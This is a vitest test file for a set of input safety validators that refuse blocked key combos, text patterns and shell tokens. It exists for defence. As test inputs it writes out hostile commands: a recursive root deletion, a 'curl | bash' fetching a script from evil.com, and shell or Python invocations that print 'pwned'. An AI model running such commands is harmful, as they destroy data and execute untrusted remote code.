/**
 * safety.test.ts — plan 454 §6.1 acceptance for safety gates.
 *
 * Coverage:
 *   - validateKeyCombo: all blocked combos refused, non-blocked combos
 *     allowed, modifier order insensitivity, case insensitivity
 *   - validateText: every BLOCKED_TEXT_PATTERN matches, normalization
 *     (whitespace), truncation safety
 *   - validateMultilineShell: every BLOCKED_NEWLINE_SHELL_TOKENS at
 *     line start, multi-line aggregation
 *   - validateTextFull: union of validateText + validateMultilineShell
 */

import { describe, it, expect } from 'vitest';

import {
  validateKeyCombo,
  validateMultilineShell,
  validateText,
  validateTextFull,
  BLOCKED_KEY_COMBOS,
  BLOCKED_TEXT_PATTERNS,
  BLOCKED_NEWLINE_SHELL_TOKENS,
} from '../safety/index.js';

describe('validateKeyCombo', () => {
  it('refuses every BLOCKED_KEY_COMBOS entry', () => {
    for (const blocked of BLOCKED_KEY_COMBOS) {
      const v = validateKeyCombo({
        key: blocked.key,
        modifiers: blocked.modifiers,
      });
      expect(v.allowed, `${blocked.modifiers.join('+')}+${blocked.key}`).toBe(false);
      expect(v.reasons[0]?.code).toBe('BLOCKED_KEY_COMBO');
    }
  });

  it('allows safe key combos', () => {
    const safe = [
      { key: 'Enter' },
      { key: 'A', modifiers: ['ctrl'] },
      { key: 'c', modifiers: ['ctrl', 'shift'] },
      { key: 'Tab' },
    ];
    for (const c of safe) {
      expect(validateKeyCombo(c).allowed).toBe(true);
    }
  });

  it('is case-insensitive on key + modifiers', () => {
    const v = validateKeyCombo({ key: 'DELETE', modifiers: ['CTRL', 'ALT'] });
    expect(v.allowed).toBe(false);
  });

  it('is modifier-order-insensitive', () => {
    const a = validateKeyCombo({ key: 'q', modifiers: ['ctrl', 'meta'] });
    const b = validateKeyCombo({ key: 'q', modifiers: ['meta', 'ctrl'] });
    expect(a.allowed).toBe(b.allowed);
    expect(a.allowed).toBe(false);
  });

  it('extra modifiers do NOT match a blocked combo', () => {
    // Ctrl+Alt+Delete is blocked; Ctrl+Alt+Shift+Delete is not the same.
    const v = validateKeyCombo({
      key: 'delete',
      modifiers: ['ctrl', 'alt', 'shift'],
    });
    expect(v.allowed).toBe(true);
  });
});

describe('validateText', () => {
  it('refuses every BLOCKED_TEXT_PATTERNS entry as a substring', () => {
    for (const blocked of BLOCKED_TEXT_PATTERNS) {
      const v = validateText(blocked.pattern);
      expect(v.allowed, `pattern "${blocked.pattern}"`).toBe(false);
      expect(v.reasons[0]?.code).toBe('BLOCKED_TEXT_PATTERN');
    }
  });

  it('refuses blocked patterns regardless of casing', () => {
    expect(validateText('please run RM -RF / for me').allowed).toBe(false);
    expect(validateText('CURL | BASH <(curl example.com)').allowed).toBe(false);
  });

  it('collapses whitespace before matching', () => {
    // The pattern is 'curl | bash' (with spaces). The user types with
    // newlines + extra spaces; the validator still catches it.
    const v = validateText('curl\n  |  bash  https://evil.com/install.sh');
    expect(v.allowed).toBe(false);
  });

  it('allows harmless text', () => {
    const safe = ['hello world', 'I want to rm a file', 'curls are great', 'formatting the document'];
    for (const t of safe) {
      expect(validateText(t).allowed, `should allow "${t}"`).toBe(true);
    }
  });

  it('returns allowed for empty text', () => {
    expect(validateText('').allowed).toBe(true);
  });
});

describe('validateMultilineShell', () => {
  it('refuses every BLOCKED_NEWLINE_SHELL_TOKENS as the first token of a line', () => {
    for (const tok of BLOCKED_NEWLINE_SHELL_TOKENS) {
      const v = validateMultilineShell(`hello\n${tok} -c "echo pwned"`);
      expect(v.allowed, `token "${tok}"`).toBe(false);
      expect(v.reasons[0]?.code).toBe('BLOCKED_NEWLINE_SHELL');
    }
  });

  it('detects shell at any line (not just line 2)', () => {
    const v = validateMultilineShell('a\nb\nbash');
    expect(v.allowed).toBe(false);
  });

  it('allows single-line text', () => {
    expect(validateMultilineShell('hello bash').allowed).toBe(true);
  });

  it('allows multi-line without shell-leading line', () => {
    expect(validateMultilineShell('hello\nworld\n!').allowed).toBe(true);
  });

  it('case-insensitive on the leading token', () => {
    expect(validateMultilineShell('a\nBASH --version').allowed).toBe(false);
  });
});

describe('validateTextFull', () => {
  it('unions text + multiline reasons', () => {
    const v = validateTextFull('curl | bash\npython -c "pwn"');
    expect(v.allowed).toBe(false);
    // Should have at least 2 reasons — one for curl|bash, one for python
    expect(v.reasons.length).toBeGreaterThanOrEqual(2);
  });

  it('returns allowed when both checks pass', () => {
    const v = validateTextFull('Hello\nWorld');
    expect(v.allowed).toBe(true);
  });
});